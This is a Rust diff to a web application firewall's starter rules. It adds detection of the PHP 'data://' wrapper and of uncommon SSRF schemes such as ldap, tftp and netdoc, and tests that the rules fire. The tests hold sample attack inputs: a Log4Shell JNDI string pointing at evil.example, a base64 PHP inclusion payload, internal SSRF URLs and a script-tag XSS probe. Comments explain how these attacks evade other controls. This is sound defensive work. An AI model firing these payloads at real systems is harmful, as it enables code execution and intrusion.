@@ -1273,7 +1273,12 @@ pub fn starter_rules() -> Vec<Rule> {
 			category: WafCategory::PathTraversal,
 			pattern: r"(?i)(/\.(claude|cursor|continue|aider|roo|zed|cline|kiro|windsurf|rovodev|codex|opencode|a0proj|plandex|fabric|n8n|junie|gemini|openclaw|clawdbot|trustclaw|zeroclaw|warp)/|/\.(qwen_code|crush)\b)",
 		},
-		Rule { id: "traversal_php_wrapper", category: WafCategory::PathTraversal, pattern: r"(?i)\b(php|phar|expect|zip|glob)://" },
+		// PHP stream wrappers. `data` is the one that was missing and the one that matters most: with
+		// `allow_url_include` on, `data://text/plain;base64,PD9waHA…` hands the interpreter a whole
+		// script inline — inclusion with no remote host to reach, so neither the `Rfi` rules (which
+		// require a remote URL) nor a network egress control sees it. Distinct from the `data:` URI the
+		// XSS rules match: that one has no `//` and targets the browser, this one targets the server.
+		Rule { id: "traversal_php_wrapper", category: WafCategory::PathTraversal, pattern: r"(?i)\b(php|phar|expect|zip|glob|data)://" },
 		// Overlong / invalid UTF-8 traversal (OWASP-CRS path-traversal evasion): the invalid multi-byte
 		// encodings of `.` and `/`/`\` — `%c0%ae` / `%e0%80%ae` (overlong `.`), `%c0%af` / `%e0%80%af`
 		// (overlong `/`), `%c1%9c` (overlong `\`). A conformant UTF-8 decoder rejects these, but a
@@ -1381,6 +1386,17 @@ pub fn starter_rules() -> Vec<Rule> {
 		// --- Server-side code / expression injection (value inspection; no client IP needed) ---
 		Rule { id: "code_log4shell_jndi", category: WafCategory::CodeInjection, pattern: r"(?i)\$\{jndi:" },
 		Rule { id: "code_log4j_nested_lookup", category: WafCategory::CodeInjection, pattern: r"(?i)\$\{[^}]{0,30}\$\{" },
+		// The remaining fetchable URL schemes an SSRF sink accepts, past the `gopher`/`dict`/`file`
+		// trio: `ldap(s)` (the JNDI/SSRF workhorse), `tftp`, `sftp`, and Java's `netdoc`.
+		//
+		// **It sits here, deliberately, and not with its `ssrf_*` siblings above.** Rule order *is*
+		// first-match order, and `${jndi:ldap://evil/a}` contains `ldap://` — so an `ldap` alternative
+		// placed up in the SSRF block would match Log4Shell payloads *before* `code_log4shell_jndi`
+		// ever ran, silently re-labelling the single most recognisable RCE in the set as an SSRF.
+		// Placing it after the JNDI rules is what keeps that attribution correct (regex-crate patterns
+		// have no lookbehind, so ordering, not the pattern, is the tool here). `ssrf_scheme_ordering_
+		// keeps_log4shell_attribution` pins it.
+		Rule { id: "ssrf_uncommon_scheme", category: WafCategory::Ssrf, pattern: r"(?i)\b(ldaps?|tftp|sftp|netdoc)://" },
 		Rule { id: "code_php_object_inject", category: WafCategory::CodeInjection, pattern: r#"(?i)\b[oc]:\d+:"[a-z0-9_\\]+":\d+:\{"# },
 		Rule { id: "code_ssti_arithmetic", category: WafCategory::CodeInjection, pattern: r"\$\{\s*\d+\s*[*]\s*\d+\s*\}" },
 		Rule { id: "code_ssti_template", category: WafCategory::CodeInjection, pattern: r"\{\{\s*\d+\s*[*]\s*\d+\s*\}\}" },
@@ -3471,6 +3487,41 @@ mod tests {
 		] {
 			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
 		}
+	}
+
+	#[test]
+	fn uncommon_ssrf_schemes_are_blocked() {
+		let waf = Waf::starter();
+		// Payloads deliberately carry no `/etc/passwd`-style tail: that would trip
+		// `traversal_sensitive_file` first and the test would pass without proving the scheme rule
+		// fires at all.
+		for value in ["u=ldap://10.0.0.5/o=corp", "u=ldaps://internal.local/x", "u=tftp://10.0.0.5/boot", "u=sftp://10.0.0.5/backup.tar", "u=netdoc:///home/app/secret"] {
+			let m = waf.inspect_str(value, "query").unwrap_or_else(|| panic!("{value} should be blocked"));
+			assert_eq!(m.category, WafCategory::Ssrf, "{value}");
+		}
+	}
+
+	#[test]
+	fn ssrf_scheme_ordering_keeps_log4shell_attribution() {
+		// The reason `ssrf_uncommon_scheme` is placed after the JNDI rules rather than with its
+		// siblings: a Log4Shell payload *contains* `ldap://`, and rule order is first-match order.
+		// If this ever reports Ssrf, the rule moved and the most recognisable RCE in the set is being
+		// mis-labelled.
+		let waf = Waf::starter();
+		let m = waf.inspect_str("x=${jndi:ldap://evil.example/a}", "header:x-api-version").unwrap();
+		assert_eq!(m.rule_id, "code_log4shell_jndi");
+		assert_eq!(m.category, WafCategory::CodeInjection);
+	}
+
+	#[test]
+	fn php_data_wrapper_is_blocked() {
+		// Inline code inclusion: no remote host, so the Rfi rules cannot see it.
+		let waf = Waf::starter();
+		let m = waf.inspect_str("page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==", "query").unwrap();
+		assert_eq!(m.category, WafCategory::PathTraversal);
+		assert_eq!(m.rule_id, "traversal_php_wrapper");
+		// The browser-facing `data:` URI is a different rule and must stay that way.
+		assert_eq!(waf.inspect_str("q=data:text/html,<script>alert(1)</script>", "query").unwrap().category, WafCategory::Xss);
 	}
 
 	#[test]
